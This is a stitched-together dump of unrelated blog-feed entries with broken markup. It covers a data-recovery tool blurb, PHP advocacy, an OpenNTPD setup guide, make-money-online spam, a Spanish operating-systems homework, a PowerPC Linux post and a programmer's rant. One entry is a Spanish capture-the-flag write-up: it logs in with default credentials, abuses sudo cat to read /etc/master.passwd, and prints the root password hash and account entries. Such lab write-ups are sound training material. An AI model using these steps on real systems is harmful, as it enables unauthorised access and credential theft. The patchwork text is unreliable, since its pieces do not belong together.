  can be shown as an ANSI or UNICODE text.   HFS and HFS file systems support. In addition to FAT/NTFS/ExtFS2/ExtFS3/UFS1/UFS2 R-Studio supports HFS and HFS file systems developed by Apple Computer for use on computers running Mac OS.  * The Windows version of R-Studio cannot be installed and run on a Mac OS system, but a hard drive with HFS and/or HFS partitions can be attached to the Windows machine and processed by R-Studio. You may also download R-Studio for Mac version that was designed for Mac environment and can be installed and run on a Mac OS system.   Apple Computers support.  New R-Studio Emergency version can be run from CD on Intel and PowerPC based Macintosh computers.   Big Endian variant of UFS support.   GPT partition layout schema support. This schema is used in 64-bit Windows OS.   APM support. Apple Partition Map (APM) is a partition scheme used to define the low-level organization of data on disks formatted for use!
  with Macintosh computers.   Support for various unusual !
 RAID con
figurations. Parameters like block size and order, offsets, and even the number of stripe blocks can be explicitly specified. Visual editor to create specific block order. Such user-defined configurations can be saved for further use.   R-Studio Technician Portable was added to R-Studio Technician package. The portable version can be run from a USB storage device.   Compressed image format support. When R-Studio creates an image of the disk or its part, the image can be compressed and split into several files to put it on CD/DVD/Flash Drive or FAT16/FAT32.  * R-Studio reads and opens the created image only for the purpose of data recovery.  For disk imaging and restoration tasks please consider R-Drive Image software.    WARNING:  NEVER TRY TO WRITE THE IMAGE FILE OR RECOVER DELETED FILES TO THE SAME DISK WHERE THE FILES RESIDE OR YOU MAY LOSE YOUR DATA ON THE DISK!   more info:  Download:   Pass:

(parece que la traduccion necesita un iconv, tengo que recordar reportarlo)  De la pista, probamos "Capture The Flag", y no funciona… probamos entonces con "CTF" y ya esta… obtenemos un archivo readme…  rmolina@maybe-failed:~$ file readme  readme: gzip compressed data, was "texto.txt", from Unix, last modified: Fri Jul  2 15:58:32 2010  luego de renombrar y extraer, tenemos un texto.txt que dice:  Mv mabi uiycqvi ycm vw ma cv Tqvcf g vw ma cv Eqvlwea bmvmuwa 10 cacizqwa kzmilwa, ikkmlm kwv cvw lm mttwa.  segundos despues, tenemos que era un cifrado Cesar, y el texto original:  en esta maquina que no es un linux y no es un windows tenemos 10 usuarios creados, accede con uno de ellos.  (por cierto, este recipe en python lo resuelve, aun sin una tabla de frecuencias para el español)  bueno… en este punto fue solo barrer la red con nmap usando el rango que nos daban en la pista… ahi encontrabamos un OpenBSD que era la maquina objetivo…  para lograr entrar se podia uno gastar un rato… pero finalmente terminabas por probar: usuario1:usuario1 :)  una vez dentro, y para cualquier usuario que probemos, nos salia un mensaje como este:  Solo Uno De nosotrOs sabe leer  Plop! pero bueno… por las mayusculas sabemos que la cosa va por sudo…  uno por uno, nos logueamos con cada usuario y probamos a hacer 'sudo su -'… para la mayoria, obtenemos el error tipico diciéndonos que el usuario no esta en la tabla de sudoers... pero para el usuario4 tenemos otro error, informandonos que usuario4 no tiene permitido usar 'su' via sudo...  probando varios usuarios, vemos que podemos usar cat :) y ya tenemos privilegios de lectura!  (para este momento, ya se me pasaba la borrachera y me empezaba la resaca)  despues de perder mucho tiempo por el lado del cgi-bin, finalmente me he pescado el /etc/master.passwd:  root:$2a$08$4q.rSm3naJ4ySoFYwCVRkuYq9Thj0TIS23Z2PG9zvkVmBPmmyeBLe:0:0:daemon:0:0:Charlie &:/root:/bin/ksh daemon:*:1:1::0:0:The devil himself:/root:/sbin/nologin operator:*:2:5::0:0:System &:/operator:/sbin/nologin bin:*:3:7::0:0:Binaries Commands and Source,,,:/:/sbin/nologin smmsp:*:25:25::0:0:Sendmail Message Submission Program:/nonexistent:/sbin/nologin popa3d:*:26:26::0:0:POP3 Server:/var/empty:/sbin/nologin sshd:*:27:27::0:0:sshd privsep:/var/empty:/sbin/nologin _portmap:*:28:28::0:0:portmap:/var/empty:/sbin/nologin _identd:*:29:29::0:0:identd:/var/empty:/sbin/nologin _rstatd:*:30:30::0:0:rpc.rstatd:/var/empty:/sbin/nologin _rusersd:*:32:32::0:0:rpc.rusersd:/var/empty:/sbin/nologin _fingerd:*:33:33::0:0:fingerd:/var/empty:/sbin/nologin _x11:*:35:35::0:0:X Server:/var/empty:/sbin/nologin _kdc:*:59:59::0:0:Kerberos Server:/var/empty:/sbin/nologin _kadmin:*:60:60::0:0:Kerberos Admin Server:/var/empty:/sbin/nologin _spamd:*:62:62::0:0:Spam Daemon:/var/empty:/sbin/nologin uucp:*:66:1::0:0:UNIX-to-UNIX Copy:/var/spool/uucppublic:/usr/libexec/uucp/uucico www:*:67:67::0:0:HTTP Server:/var/www:/sbin/nologin _isakmpd:*:68:68::0:0:isakmpd privsep:/var/empty:/sbin/nologin named:*:70:70::0:0:BIND Name Service Daemon:/var/named:/sbin/nologin proxy:*:71:71::0:0:Proxy Services:/nonexistent:/sbin/nologin _syslogd:*:73:73::0:0:Syslog Daemon:/var/empty:/sbin/nologin _pflogd:*:74:74::0:0:pflogd privsep:/var/empty:/sbin/nologin _bgpd:*:75:75::0:0:BGP Daemon:/var/empty:/sbin/nologin _tcpdump:*:76:76::0:0:tcpdump privsep:/var/empty:/sbin/nologin _dhcp:*:77:77::0:0:DHCP programs:/var/empty:/sbin/nologin _mopd:*:78:78::0:0:MOP Daemon:/var/empty:/sbin/nologin _tftpd:*:79:79::0:0:TFTP Daemon:/var/empty:/sbin/nologin _rbootd:*:80:80::0:0:rbootd Daemon:/var/empty:/sbin/nologin _afs:*:81:81::0:0:afs Daemon:/var/empty:/sbin/nologin _ppp:*:82:82::0:0:PPP utilities:/var/empty:/sbin/nologin _ntp:*:83:83::0:0:NTP Daemon:/var/empty:/sbin/nologin _ftp:*:84:84::0:0:FTP Daemon:/var/empty:/sbin/nologin _ospfd:*:85:85::0:0:OSPF Daemon:/var/empty:/sbin/nologin <span class="Apple-sty]]></summary>

  <title><![CDATA[Advantages of PHP Application Development]]></title>
  <summary><![CDATA[PHP is choice of many developers who are doing robust applications development. It is an opensource language so any developer can use it freely. It reduces the initial investment that you have to do for proprietary languages-License. You can obtain its license free. Its vast development community is constantly improving and updating its core functionalities. PHP extension and PHP repository system create and maintain a vast library code packages that is available for any user. These code packages perform functions like authentication, caching, destructors, encryption, error handling with php application development. PHP is highly compatible with majority of leading operating systems and web servers. So you can install it on any system means it is easily deployable across several platforms. File handling and management is easy with PHP as PHP can read text and generate files in various forms like PDF and XML. You can upload the file and documents and store on servers using the file manipulation functions. Through PHP code you can upload and manipulate files and documents. PHP enables remote editing of files or documents. PHP compilers have features to optimize and improve the quality of compiled code by reducing the size and execution time of code thereby leads to improve the overall performance. Cache of compiled code is possible using various PHP accelerators like xcache, eAccelerator, etc. thereby you can reduce the time spent in parsing and compiling the code every time it is good for php programmers.  Plenty of debuggers are available with PHP to identify and analyze the potential bugs and bottlenecks. With PHP you will have extensive sessions and cookie management features available so you can develop highly personalized web pages. PHP has property to generate images and graphics dynamically. The graphic design library of PHP have host of features and functionalities that you can use to create images in various formats such as gif, jpeg and png, etc. To include custom create extensions and components PHP can be modified this way we can increase its extensibility. PHP can be written to interact with majority of databases with a host of database connectivity features which provide the support for various platforms such as MySQL, Microsoft SQL Server, Oracle, PostgreSQL etc. It is easy to develop small personal websites as well as big enterprise application with PHP. You can develop informative forums, chatting platforms, CRM solutions, e-commerce shopping carts, community websites, e-business, shopping carts and gigantic database driven sites, etc. with php mysql development. PHP has great cross platform compatibility. You can run it across operating systems like Linux, Windows, Solaris, OpenBSD, and Mac OSX etc. PHP also provides support for all major web servers like Apache, IIS, iPlanet etc. PHP has an obvious advantage that it never puts strain on the server. It almost utilizes its own inbuilt memory space so it decreases the workload from the server and other processes. Thus, it gives an enhancement of the speed. PHP operates without any external plug-ins so it is an independent language. Your project will commence in short duration with PHP so you can reduce development cost and time.

  <title><![CDATA[Debian: Zeit automatisch synchronisieren]]></title>
  <summary><![CDATA[Im Gegensatz zu dem anderen Artikel hier auf Tuxhausen, beschreibe ich hier wie du die Zeit auf deinem Debian-Rechner automatisch synchronisierst. 
Dieses Verfahren hat auch noch einen anderen großen Vorteil: 
OpenNTPD passt die Zeit auf deinem System in vielen kleinen Schritten an, so entstehen keine Sprünge in der Zeit, was vor allem bei Logdateien, aber auch einigen Programmen, zu Verwirrung führen kann. 
Ich benutze das den OpenNTPD aus dem OpenBSD-Projekt, dieser kann schnell und einfach installiert werden. 
Installation

Als root: aptitude install openntpd
Fertig !!

Wenn alles geklappt hat, was dank aptitude zu 99,99% der Fall ist, findest du einen Log unter /var/log/daemon.log: 
un 26 11:41:07 s15199574 ntpd[15820]: ntp engine ready 
Jun 26 11:42:26 s15199574 ntpd[15820]: peer 213.9.73.106 now valid 
Jun 26 11:42:27 s15199574 ntpd[15820]: peer 85.214.45.166 now valid 
Jun 26 11:42:28 s15199574 ntpd[15820]: peer 217.79.182.184 now valid 
Jun 26 11:42:32 s15199574 ntpd[15820]: peer 109.75.190.27 now valid 
Jun 26 11:43:52 s15199574 ntpd[15820]: adjusting local clock by -19.153906s 
Hier muss der Server um genau 19.153906s korrigiert werden, und das kann schon mal einige Stunden dauern, da OpenNTPD das nur sehr langsam macht. 
Wenn es schneller gehen soll, dann guck mal hier: Debian: Zeit synchronisieren mit ntpdate 
Konfiguration
Dafürt ist die Datei /etc/openntpd/ntpd.conf zuständig. 
Eigentlich braucht man im Normalfall noch nicht mal was zu konfigurieren, da bei Debian schon mal 4 Debian NTP-Server eingetragen werden und der Server auf keinem Port hört (listen). 
Solltest du doch etwas ändern wollen, hier einige Tipps: 
#listen on * 
= auf welchen Interface der Server auf Anfragen hört (nicht nötig wenn du nur lokal die Uhrzeit stellen möchtest 
server 0.debian.pool.ntp.org 
=> Eintrag eines NTP-Server. Es können auch mehrere eingetragen werden, so bist du sicher auch wenn einer ausfällt]]></summary>

  <title><![CDATA[Go On With Making Money Online.]]></title>
  <summary><![CDATA[In my previous article I made an attempt to enumerate ways of making money on the net. I think that itâ€™s high time to continue. Perhaps I should start with affiliate marketing. Affiliate marketing is a very popular way of making money on the Internet. In fact the essence of this earning is very simple. A particular seller wants to make other people buy his products or services. So naturally he wants you to attract potential clients to his selling website. It goes without saying that heâ€™s ready to pay you regular commissions for your assistance. For example you can get paid for every visitor gone to that site from your affiliate link. But some sellers can only pay you if only visitors make a purchase or sign up. In this case a seller shares a part of his earning with you. When dealing with affiliate marketing people use different ways to attract potential customers to the required website. For example they can use banners, text links, reviews, forums and so on.    
The latest trend on the Internet is making money with widgets. In fact widgets can be helpful if you want to monetize your website. Some of them are used in accordance with this well known PPC scheme while others are just ads in the form of text links. Sometimes itâ€™s very difficult to distinguish this money making scheme from affiliate marketing. Perhaps you should ask your friends additional question on this matter. Most probably theyâ€™ve been already using widgets quite successfully in their money making.  
Then you should try so called sponsored reviews. Excuse me, I canâ€™t tell you who is supposed to be the initiator of this money making scheme. I really donâ€™t know this guyâ€™s name, but it doesnâ€™t matter in this case. If you join one of these systems then youâ€™ll get an excellent opportunity to write paid posts on a wide range of topics. It goes without saying that not all bloggers are going to write about a particular product or a certain website for money but those guys who do this make good money indeed. If your blog has a large audience, you can offer sponsors your writing reviews on particular topics. Donâ€™t miss this promising opportunity. Itâ€™s real chance to make big money if you have good writing skills of course.  
You should also pay attention to advertising in RSS Feed. With the rapid spread of RSS technology on the net millions of Internet users, owners of websites have begun to look for ways to gain profit from this new way of earning living. Feedburber has got its own publishing network and you can sign up to start running ads in the basement of your feed. Bidvertiser has recently introduced a RSS feed for a special promotion option with PPC scheme. So you can start using this promising option right now. I hope youâ€™ll implement all of this mentioned above quite successfully. 
So you decided to make money in the net – congratulations. But it’s too early to open champagne, because now you should know practical ways to make money online and what strategy will help you. 
Start from visiting this site that will show you 
versatile ways to make money online and will  explain how these ways to make money online work on the market.

  <title><![CDATA[Sistemas Operativos]]></title>
  <summary><![CDATA[DESARROLLO ACTIVIDAD NUMERO 1  ABRIL 21 DEL 2010 TECNICO EN MANTENIMIENTO DE EQUIPOS DE CÓMPUTO  MIGUEL CAMILO GUTIERREZ RUIZ  GRUPO 1      Desarrollo de la Actividad No.1   1) Que es un Sistema Operativo?  Es un Software que actúa como interfaz entre los dispositivos de Hardware y los programas usados por el usuario para manejar un computador. Las funciones básicas del Sistema Operativo son administrar los recursos de la máquina, coordinar el hardware y organizar archivos y directorios en dispositivos de almacenamiento.   2) En qué consiste el Lenguaje Assembler?  Es un tipo de lenguaje de bajo nivel, utilizado para escribir programas informativos y constituye la representación más directa del Código Maquina específico para cada Arquitectura de Computadora legible por un programador. Características: El lenguaje ensamblador es difícilmente portable, es decir, un código escrito para un microprocesador, suele necesitar ser modificado, muchas veces en su totalidad para poder ser usado en otra máquina distinta, aun con el mismo microprocesador. Los programas hechos en lenguaje ensamblador son generalmente más rápidos y consumen menos recursos del sistema (memoria RAM y ROM). Al programar cuidadosamente en lenguaje ensamblador se pueden crear programas que se ejecutan más rápidamente y ocupan menos espacio que con lenguajes de alto nivel. Con el lenguaje ensamblador se tiene un control muy preciso de las tareas realizadas por un microprocesador por lo que se pueden crear segmentos de código difíciles de programar en un lenguaje de alto nivel.  También se puede controlar el tiempo en que tarda una rutina en ejecutarse, e impedir que se interrumpa durante su ejecución   3) En un Sistema Operativo, Que es un Comodín?  Es el símbolo que sustituye a cualquier carácter o grupo de caracteres tradicionalmente, el Asterisco (*), que representa cualquier grupo de caracteres, y la Interrogación (?), que representa un único carácter. En el caso del Lenguaje SQL cumple función de comodín el carácter (%).    4) Fabricantes de Sistemas Operativos y Marcas donde se aplican.   * AmigaOS - Commodore International * Amoeba - Andrew S. Tanenbaum * BeOS - Be Incorporated * DR-DOS - Microsoft * DragonFly BSD - The DragonFly Team * FreeBSD - Proyecto FreeBSD (Parte de la Familia BSD) * FreeDOS - Jim Hall y el Equipo FreeDOS * GNU/Linux - Linux Torvalds * GNU Hurd - Thomas Bushnell, Roland McGrath, Marcus Brinkmann. * MacOS - Apple Inc. * Minix - Andrew S. Tanenbaum (Clon de Unix) * MS-DOS - Microsoft * NetBSD - Fundación NetBSD (Parte de la Familia BSD) * OpenBSD - Proyecto OpenBSD (Parte de la Familia BSD) * PC-DOS - Microsoft * Plan 9 - Laboratorios Bell (Susesor de Unix) * OS/2 - IBM, Microsoft * QDOS - Seattle Computer Products/ Tim Paterson * QNX - QNX Software Systems * Solaris - Sun Microsystems * Microsoft Windows - Microsoft * Unix - AT&T Laboratorios Bell * Xenix - Microsoft (Sistema Operativo de tipo Unix) * Symbian Os - Symbian Foundation    5) Prompt (Prontuario del Sistema). Es un carácter o conjunto de caracteres, que se muestran en una línea de Comandos para indicar que está a la espera de órdenes. Pude variar dependiendo del intérprete de Comandos y Suele ser Configurable. Ej. C:\> (Sistema Operativo D.O.S.).    6) Particiones de Disco Duro y su Función.  Es el nombre genérico que recibe, cada división presente en una sola unidad física de Almacenamiento de Datos. Toda partición tiene su propio sistema de archivos (Formato); Generalmente, casi cualquier sistema operativo interpreta, utiliza y manipula cada partición como un disco físico independiente, a pesar de que dichas particiones estén en un solo disco físico. Tipos de Particiones: Partición Primaria.Son divisiones crudas del disco, solo puede haber cuatro de estas o 3 y una extendida. Depende de una tabla de particiones. Un disco físico completamente formateado, consiste en realidad de una partición primaria que ocupa todo el espacio del disco y posee un sistema de archivos. A este tipo de particiones, prácticamente cualquier sistema operativo puede detectarlas y analizarles una unidad, siempre y cuando el sistema operativo reconozca su formato.   Partición Extendida.Actúa como una partición primaria, sirve para contener infinidad de unidades lógicas en su interior. Fue ideada para romper la limitación de 4 particiones primarias en un solo disco físico. Solo puede existir una partición de este tipo por disco, y solo sirve para contener particiones lógicas. Es el único tipo de partición, que no soporta un sistema de archivos directamente.   Partición Lógica.Ocupa una posición de la partición extendida o la totalidad de la misma, la cual se ha formateado con un tipo especifico de sistema de archivos (FAT32, NTFS, Ext2…) y se le a asignado una unidad, así el sistema operativo, reconoce las particiones lógicas o su sistema de archivos. Puede haber un máximo de 23 particiones lógicas en una partición extendida.     7) Cual es el proceso de instalación de un sistema operativo.  Fases de Instalación de un Sistema Operativo  Preparar el equipo para arrancar desde CD/DVD.Preparación del Disco Duro:Ejecutar el programa de instalaciónProporcionar el nombre y contraseña del usuario que será administrador del sistema.Seleccionar los componentes software opcionales que queremos instalar.Ajustar los parámetros de la red.Instalar el gestor de arranque.Realizar las actualizaciones de seguridad.Instalar los plugins del navegador.Instalar los Drivers necesarios para los dispositivos no reconocidos en la instalación  Preparar el equipo para arrancar desde CD/DVD. Los equipos modernos suelen estar ya preparados para ello. No obstante, si al introducir el CD de instalación, no se ejecutase el programa de instalación, habrá que modificar la configuración de la BIOS, para escoger el CD/DVD como primer dispositivo para el arranque.  Esta operación depende del modelo de placa base/madre del equipo, por lo que de ser posible consultaremos la documentación del fabricante. Normalmente, para acceder a la modificación de la configuración de BIOS, hay que pulsar la tecla “Suprimir”, “F2” en los primeros segundos del POST (comprobación del sistema en el encendido).  Luego, en la configuración avanzada, debemos cambiar el parámetro BOOT para que el primer dispositivo sea el CD. Esta operación difiere mucho entre distintos ordenadores. Manipular otros parámetros de la BIOS puede dejar al ordenador inservible. Solicite ayuda a algún experto si no sabe qué hacer. Seleccione la opción de salir sin salvar los cambios (EXIT Without update). Finalmente, hay que seleccionar la opción salvar cambios y salir (normalmente pulsando F10).   Preparación del Disco Duro: Esta fase consiste en crear las particiones del tipo necesario para que nuestro S.O. Pueda instalarse. En Windows los tipos de particiones que se emplean son FAT32 (Windows 95/98) y NTFS (Windows NT/2000 y XP). En Linux/UNIX, se aceptan muchos más tipos de particiones, siendo el sistema de ficheros más popular el EXT3.  Si queremos instalar un sistema operativo en un disco donde ya haya otro sistema operativo instalado, ES MUY IMPORTANTE HACER COPIA DE SEGURIDAD DE LOS DATOS IMPORTANTES ANTES DE PROSEGUIR LA INSTALACIÓN, ya que existe un alto riesgo de perderlos TODOS por un error durante el proceso. Una vez hecho esto, tendremos dos opciones:  ● Sustituir el sistema operativo anterior ● Instalarlo permitiendo su coexistencia y selección durante el periodo de arranque del ordenador. Si elegimos la primera opción, suele ser buena idea borrar en el proceso de instalación las particiones antiguas y después crear las nuevas, realizando una comprobación completa de su estado para conocer si hay errores o defectos en el disco. En el caso de querer hacer una instalación dual, habrá que conseguir espacio suficiente para instalar el nuevo sistema operativo, normalmente restándoselo a las particiones existentes anteriormente para el primer sistema. Esta delicada tarea, suele hacerse con herramientas software especiales, como “Partition Magic” o la libre y gratuita bajo Linux QTParted. En ambos casos, es muy recomendable realizar una sola modificación cada vez y llevarla a efecto, en lugar de programar Varias encadenadas. Los programas instaladores de Linux, suelen incorporar herramientas que permiten dicha modificación. No ocurre así en los de Windows, que solo permiten borrar antiguas y crear nuevas. Suele ser muy interesante por motivos de seguridad, crear particiones independientes para guardar los datos de los usuarios (por ejemplo una unidad D: en Windows, o directorio /home en Linux).   Ejecutar el programa de instalación Para ello, normalmente bastará con introducir el CD de instalación y volver a encender el equipo con el dentro. Debemos estar atentos a los primeros instantes para leer un posible mensaje de proceder a la instalación y aceptarlo. En caso contrario, bastará con esperar sin hacer nada.   Proporcionar el nombre y contraseña del usuario que será administrador del sistema. Todo sistema multiusuario que se precie, debe tener un responsable de su funcionamiento, mantenimiento y de otorgar permisos de uso del equipo y/o sus recursos a terceros. Es durante la fase de instalación durante la que se especifica la contraseña pare el mismo. En los sistemas UNIX, el nombre del administrador es siempre “root”. En sistemas como Windows, UBUNTU o GuadaLinex, esta labor la lleva el primer usuario creado, hasta que se especifique lo contrario.   Seleccionar los componentes software opcionales que queremos instalar. Muchas distribuciones de S.O. pueden contener software adicional (en ocasiones varios CD o DVDs) que puede ser instalado durante la instalación del mismo. Es habitual que se nos pregunte por qué selección de programas recomendada o personalizada queremos instalar. Una vez hecho esto, comienza la copia de todos los ficheros necesarios desde los soportes de instalación al disco duro del equipo.   Ajustar los parámetros de la red. Si nuestro equipo va a ser utilizado en una red local o en Internet, habremos de configurar adecuadamente el dispositivo de comunicaciones (normalmente la tarjeta de red). Para ello, necesitaremos obtener la información pertinente del administrador de la red o del proveedor de servicios de Internet que tengamos contratado en su caso.  Lo más común, (y por tanto la instalación por defecto) es que los equipos se configuren de modo que automáticamente consigan el ajuste necesario de la red desde otro equipo que los coordina a todos, mediante un protocolo denominado DHCP (Dinamyc Host Control Protocol). Si es así, no necesitamos hacer nada más.  En caso contrario, deberemos obtener y anotar la información correspondiente para la tarjeta de red: (todos ellos combinaciones de 4 números del 0 al 255 separados por puntos)  Dirección IP: el número que distingue nuestro ordenador en la red para comunicar. Máscara de subred: un número que ayuda a distinguir si las direcciones que buscamos son de nuestra red local o externos. Normalmente es 255.255.255.0 Puerta de enlace predeterminada: la dirección I.P. del equipo (p.ej. Router) que nos da acceso a otras redes, como por ejemplo Internet. Dirección de un servidor de D.N.S.: La dirección del equipo que puede informarnos de la dirección IP de otro que solo conocemos por su nombre de dominio. Hacen el trabajo de las “páginas blancas” de Internet. Pueden obtenerse I.P.'s de DNS desde: http://www.bandaancha.st/toolsdns.php   Instalar el gestor de arranque. Al instalar el sistema operativo, es necesario incluir en el sector de arranque del Disco Duro (llamado MBR o Máster Boot Record), un pequeño programa que nos permite encontrar en qué parte del disco se encuentran los distintos sistemas operativos, y seleccionar uno para comenzar a trabajar cuando encendemos el equipo.  En las instalaciones de Linux, el programa en cuestión suele ser el LILO (Linux Loader) o GRUB (Grand Unified Bootloader). En Windows, tras su instalación, se destruye el cargador de arranque que estuviese antes, y solo quedará la posibilidad de acceder a dicho sistema operativo. Es por ello muy conveniente que de tener instalado Linux en nuestro ordenador además de Windows, dispongamos de un disquete de arranque que también tenga el GRUB o LiLo en él para poder arreglar el destrozo que provocará la reinstalación de Windows cuando probablemente ocurra. Si tras instalar Linux, no podemos arrancar el Windows anteriormente instalado (caso poco probable), podremos reponer el de Windows con un disco de arranque de Windows introduciendo por teclado la orden: fdisk /mbr.  Asegúrese de tener antes un disquete o CD de arranque con LiLo o GRUB configurado antes de usar fdisk, o no podrá volver a arrancar Linux después. Realizar las actualizaciones de seguridad. Probablemente, desde que se publicó la versión de nuestro S.O. hasta el momento de la instalación, se han publicado correcciones del mismo que pueden aplicarse mediante un proceso de actualización a través de Internet, o de discos de “Service Pack” que las contienen cuando ya son muy numerosas.  De no llevarlas a cabo, es muy probable que en poco tiempo tengamos problemas causados por virus, intrusos a través de la red o fallos del propio S.O. desconocidos en el momento de su publicación.   Reiniciar el sistema Es la fase final de la instalación, y nos mostrará que el sistema está convenientemente instalado. Antes de hacerlo, debemos asegurarnos de que hemos retirado el CD/DVD de instalación, o volveremos otra vez iniciar el proceso. Si es así, apagamos el equipo y sacamos inmediatamente el CD/DVD en los primeros instantes del arranque.   Instalar los “plugins” del navegador Los “plugins” son pequeños programas que añaden a otro nuevas funcionalidades, como permitir a nuestro navegador visualizar contenidos y páginas web que no son documentos puros HTML.  Los más usados hoy y considerados imprescindibles son: JAVA para ejecutar programas interactivos, juegos, chats, etc. Macromedia Flash Player /Shokwave para visualizar contenidos multimedia interactivos desarrollados con programas de dicho fabricante. Adobe Reader para visualizar documentos en formato .pdf que cada vez están más extendidos. Normalmente, en Windows, al visitar una página que los emplee, les dirigirá de forma automática a la página donde descargar el plugin para que lo instale. En Linux, la instalación debe realizarla en administrador, preferentemente mediante el correspondiente paquete de su distribución.   Instalar los Drivers necesarios para los dispositivos no reconocidos en la instalación Es habitual que si se instala el sistema operativo, no nos funcione aún o al menos correctamente la impresora, el escáner, la “tarjeta de sonido” la tarjeta gráfica, la tarjeta sintonizadora de TV, etc.  Para que puedan hacerlo, es necesario instalar en nuestro S.O. Los DRIVERS de los mencionados dispositivos correspondientes a la versión de nuestro sistema operativo, y a ser posible actualizados.  Un “Driver” es un pequeño programa que se encarga de hacer comunicar y funcionar un dispositivo hardware en el S.O. En muchos casos, el propio S.O. los instala, pero debido a la gran variedad de tipos de dispositivos y de fabricantes existentes en la actualidad, es imposible incluirlos todos. Para conseguir los drivers, recurrimos al disco de instalación del dispositivo o a la página WEB del fabricante del mismo (por ej.: HP, EPSON, Nvidia, ATI, CREATIVE, etc...), seleccionando los de nuestro S.O. y versión del mismo. En ocasiones suele ser necesario reiniciar el ordenador (casi siempre en Windows).    8) Cuales son los diferentes tipos de Instrucciones de un Sistema Operativo?   Orden secuencialEsta es la orden simple. ‘Haz esto’ y sigue por la siguiente orden. Ejemplos: Suma la variable1 y la variable2 y guardas el resultado en la variable3. . Orden repetitiva.Este tipo de órdenes, junto con las del tipo 3, provocan una ruptura en la secuencia de ejecución, ya que generan ‘saltos’ de dicha secuencia. Las órdenes repetitivas provocan que nuestro sistema operativo repita una y otra vez una serie de órdenes hasta que se cumpla una condición que hará que finalice   Orden alternativa o condicional.Este tipo de órdenes provocan que dependiendo de una o varias variables, se realice una parte del código u otra.    9) En qué consiste la memoria extendida de un sistema operativo? La memoria convencional son los primeros 640 KB. En los primeros computadores IBM PC y compatibles, era la porción de memoria disponible para los programas en MS-DOS. Arriba de ella estaba el UMA, originalmente reservada para dispositivos de hardware.     10) En qué consiste la Memoria Real y Virtual de un Sistema Operativo? Memoria RealLa memoria real o principal es en donde son ejecutados los programas y procesos de una computadora y es el espacio real que existe en memoria para que se ejecuten los procesos. Por lo general esta memoria es de mayor costo que la memoria secundaria, pero el acceso a la información contenida en ella es de más rápido acceso. Solo la memoria cache es más rápida que la principal, pero su costo es a su vez mayor.  Memoria VirtualEs la que permite al software usar más memoria principal que la que realmente posee el ordenador. La mayoría de los ordenadores tienen cuatro tipos de memoria: registros en la CPU, la memoria caché (tanto dentro como fuera del CPU), la memoria física (generalmente en forma de RAM, donde la CPU puede escribir y leer directa y razonablemente rápido) y el disco duro que es mucho más lento, pero también más grande y barato.]]></summary>

  <title><![CDATA[ppc Linux on the PowerMac G5]]></title>
  <summary><![CDATA[With Apple’s abandonment of PPC as of Snow Leopard, I began wondering what to do with the old PowerMac. It’s annoying that so (comparatively) recent a piece of equipment should be given up by its manufacturer, but that’s a rant for another day. Yes, we can still run Leopard until it goes out of support, but with S and I both on MacBook Pros with current OS I know that we would both become frustrated with a widening functionality gap between the systems. 
I had always resisted runing Linux on the PowerMac, thinking that the last thing I needed was yet another Linux box in the house. I had tried a couple of times, but it was in the early days of support for the liquid cooling system in the dual-2.5Ghz model and those attempts failed dismally. I figured that by now those issues would be resolved and I would have a much better time. 
I assumed that Yellow Dog was still the ‘benchmark’ PPC Linux distro, so I went to their site. I saw a lot of data there about PS3 and Cell; it seems that YDL is transitioning to the cluster and/or research market by focussing on Cell. 
The next thing I discovered is the lack of distributions that have a PPC version, even as a secondary platform. My old standby Gentoo still supports PPC, as does Fedora (I think: I saw a reference to downloading a PPC install disk, bit didn’t follow it), but every other major distro has dropped it — openSUSE, for example, with their very latest release (their download page still has a picture of a disc labelled “ppc”, but no such download exists, oops). I guess that since the major producer of desktop PPC systems stopped doing so, the distros saw their potential install base disappear. Unfortunately for those distros, I can see the reverse happening: now that Apple has fully left PPC behind, plenty of folks like me who have moderately recent G4 and G5 hardware and who still want to run a current OS will come to Linux looking for an alternative… I guess time will tell who is right on this one. 
So I went to install Gentoo, and to cut a long story short I had exactly the same problem as before: critical temperature condition leading to emergency system power-off. I found that if I capped the CPU speed to 2Ghz I could stay up long enough to get things built, but then the system refused to boot because it couldn’t find the root filesystem. Probably something to do with yaboot, SATA drives and OpenFirmware. So again I’m putting it aside. 
My next plan was to treat it as a file server. Surely a BSD would support my G5 hardware: after all, Mac OS X is BSD at heart… Well, no. FreeBSD has no support for SATA on ppc, OpenBSD specifically mentioned liquid-cooled G5s as having no support, and I don’t think I saw any ppc support on NetBSD more recent than G3 [1]. 
This is one of the things that annoys me about the computer industry: that somehow it’s okay to so completely disregard your older releases. What if the automotive industry worked that way? 
So I may yet try Fedora, or give the game away for another year or so and see what the situation looks like then. 
[1] I may have mixed up a couple of these details. 
Edit: Gentoo’s yaboot has managed to make it so that I can’t boot Mac OS X on the machine any more.  Oh dear.]]></summary>

  <title><![CDATA[What's that I hear from afar? Haters? Set us up the bomb.]]></title>
  <summary><![CDATA[So, I was curious to check out my analytics data today, which I haven't done in quite a while, and I noticed that I got a LOT more traffic than usual (about a 188% gain, to be exact). Of course, I don't have much traffic to begin with, so you can just imagine what "188%" could mean... but anyways.  I looked into it a little further, and it turns out most of my traffic was coming from reddit, about a week ago. "Wow" I thought, "my site is actually being checked out, for once!".  Well, after looking at the referral URL, I came to the conclusion that some people must really hate me. It was a small thread of comments, but apparently my "deflash" program I made was the "worst piece of C++ code I've seen in a while", "practically the definition of "overkill" " (why the quotes on overkill?), and written by a "typical ubuntu user".  Well, those comments on their own don't bother me, and it flatters me that eazy87 assumes I'm a " Ruby or Perl part-time programmer" (is that a bad thing, either way?).  What bothers me is that they would comment and rant their misdirected hate on a page I would probably never see, and make misinformed assumptions about me, and never post a single comment on my site. I'll admit, I'm not the worlds best programmer (period), and I've only been programming in C++ for one year (not to mention C++ is my first language), but come on guys! Show some love! If my code is literally THAT bad, then say something! Don't hide in the back corners hating on people because you can.  As for a  couple of comments, I would like to at least say something in my defense. First off, about saying it only works in Ubuntu. I will admit, I enjoy Ubuntu, I use Ubuntu, and, naturally, for people who are new to the entire concept of linux, I enjoy making things for "noobs" and showing them how to do things with their system.  What i don't find funny, nor do i appreciate, is being labeled a "typical ubuntu user". Over the past 3-5 years, I have ran, installed, and used a wide variety of distrobutions, like SuSe, Debian, Mandriva, Gentoo, Slax, Knoppix, OpenBSD unix, Dreamlinux, and many others that I can't even recall (you know how many distros there are). I have used a variety of user interfaces ranging from the popular GNOME and KDE, down to the less used, lxde, Sugar and ude.  Most recently, I have decided to settle with ubuntu because (YES) it's easy. Granted, I don't appreciate them removing and adding so many features and modifications from upgrade to upgrade, but that stuff happens. I find that if the average computer user would even consider switching to a linux kernel based open source operating system, ubuntu would probably be their best bet, because people like me are trying to make it as simple for them as possible for them, without forcing them to do their own research every time they have a problem (like windows users...).  Second, as for my 